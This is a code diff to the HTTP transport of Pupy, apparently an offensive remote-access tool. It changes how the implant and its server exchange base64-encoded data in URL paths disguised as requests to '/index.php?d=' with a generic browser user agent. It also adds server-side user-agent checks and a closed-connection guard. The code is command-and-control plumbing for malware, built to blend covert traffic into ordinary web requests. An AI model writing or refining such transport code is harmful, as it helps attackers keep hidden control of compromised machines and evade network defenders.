@@ -8,6 +8,8 @@ from ..base import BasePupyTransport
 import base64, random, string, logging
 from collections import OrderedDict
 import traceback
+import threading
+from .utils import *
 
 class InvalidHTTPReq(Exception):
     pass
@@ -39,8 +41,8 @@ class PupyHTTPClient(PupyHTTPTransport):
     client=True
     method="GET"
     keep_alive=True
-    path="/"
-    user_agent="Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36"
+    path="/index.php?d="
+    user_agent="Mozilla/5.0"
     host=None # None for random
     def __init__(self, *args, **kwargs):
         PupyHTTPTransport.__init__(self, *args, **kwargs)
@@ -107,6 +109,10 @@ class PupyHTTPServer(PupyHTTPTransport):
     client=False
     response_code="200 OK" 
     server_header="Apache"
+    path="/index.php?d="
+    verify_user_agent=None # set to the user agent to verify or None not to verify
+
+
     def __init__(self, *args, **kwargs):
         PupyHTTPTransport.__init__(self, *args, **kwargs)
         self.headers={
@@ -119,6 +125,8 @@ class PupyHTTPServer(PupyHTTPTransport):
             raw data to HTTP response
         """
         try:
+            if self.closed:
+                return
             d=data.peek()
             encoded_data=base64.b64encode(d)
             response="HTTP/1.1 %s\r\n"%self.response_code
@@ -135,14 +143,26 @@ class PupyHTTPServer(PupyHTTPTransport):
     def http_req2data(self, s):
         if not s.startswith(("GET ", "POST ", "HEAD ", "PUT ")):
             raise InvalidHTTPReq()
-        first_line=s.split("\r\n")[0]
+        first_line, headers=s.split("\r\n",1)
+        if self.verify_user_agent is not None:
+            found_ua=False
+            try:
+                for name, value in [[i.strip() for i in x.split(":",1)] for x in headers.split("\r\n")]:
+                    if name.lower()=="user-agent":
+                        if value.strip()==self.verify_user_agent.strip():
+                            found_ua=True
+            except:
+                raise MalformedData("invalid user agent")
+            if not found_ua:
+                raise MalformedData("invalid user agent")
         if not first_line.endswith(" HTTP/1.1"):
             raise InvalidHTTPReq()
         method, path, http_ver=first_line.split()
         try:
-            decoded_data=base64.b64decode(path[1:])
+            decoded_data=base64.b64decode(path[len(self.path):])
         except:
             raise MalformedData("can't decode b64")
+
         return decoded_data
 
     def downstream_recv(self, data):
